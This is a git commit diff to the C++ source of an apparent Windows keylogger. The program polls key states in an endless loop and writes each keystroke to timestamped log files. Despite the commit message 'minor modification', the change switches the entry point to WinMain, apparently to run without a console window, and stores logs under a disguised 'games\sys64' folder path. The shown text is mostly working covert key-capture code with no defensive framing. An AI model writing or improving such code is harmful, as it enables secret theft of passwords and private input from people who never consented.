ab31079c4d6310060b6f1f033f77f0db13ea9ebb
NobelTad <nobeltadele.official@gmail.com>
2025-05-05 17:19:20 +0300

    minor modification

--- main.cpp
+++ main.cpp
@@ -4,18 +4,41 @@
 #include <ctime>
 #include <direct.h>
 #include <map>
+#include <iostream>
+#include <sys/stat.h>  // For _stat()
 
 std::string GetTimestampFilename() {
     time_t now = time(0);
     struct tm* t = localtime(&now);
     char buffer[32];
     strftime(buffer, sizeof(buffer), "%Y%m%d%H%M", t);
-    return std::string("log/") + buffer + ".txt";
+
+    std::string logFolder = "C:\\fake\\LINA\\Desktop\\games\\sys64\\log";
+    std::string fullPath = logFolder + "\\" + buffer + ".txt";
+
+    std::cout << "Log file created at: " << fullPath << std::endl;
+    return fullPath;
+}
+
+bool DoesFolderExist(const std::string& folderPath) {
+    struct _stat info;
+    return (_stat(folderPath.c_str(), &info) == 0 && (info.st_mode & _S_IFDIR));  // Check if it's a directory
 }
 
 void CreateLogFolder() {
-    _mkdir("log");
+    std::string logFolder = "C:\\fake\\LINA\\Desktop\\games\\sys64\\log";
+
+    if (!DoesFolderExist(logFolder)) {
+        if (_mkdir(logFolder.c_str()) == -1) {
+            std::cout << "Failed to create log folder. Error code: " << GetLastError() << std::endl;
+        } else {
+            std::cout << "Created log folder at: " << logFolder << std::endl;
+        }
+    } else {
+        std::cout << "Log folder already exists at: " << logFolder << std::endl;
+    }
 }
+
 
 void LogKey(std::ofstream& file, int key) {
     switch (key) {
@@ -48,12 +71,19 @@ void LogKey(std::ofstream& file, int key) {
     file.flush();
 }
 
-int main() {
-    CreateLogFolder();
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) {
+    CreateLogFolder();  // Ensure the log folder is created at the absolute path
     std::string filename = GetTimestampFilename();
     std::ofstream file(filename, std::ios::app);
 
-    std::map<int, bool> keyState; // keep track of key releases
+    if (file.is_open()) {
+        std::cout << "Log file created: " << filename << std::endl;
+    } else {
+        std::cout << "Failed to create log file: " << filename << std::endl;
+        return -1;  // Exit if file creation failed
+    }
+
+    std::map<int, bool> keyState; // Keep track of key releases
 
     while (true) {
         Sleep(10);
@@ -65,7 +95,7 @@ int main() {
                 keyState[key] = true;
                 LogKey(file, key);
             } else if (!isPressed && keyState[key]) {
-                keyState[key] = false; // key released
+                keyState[key] = false; // Key released
             }
         }
     }
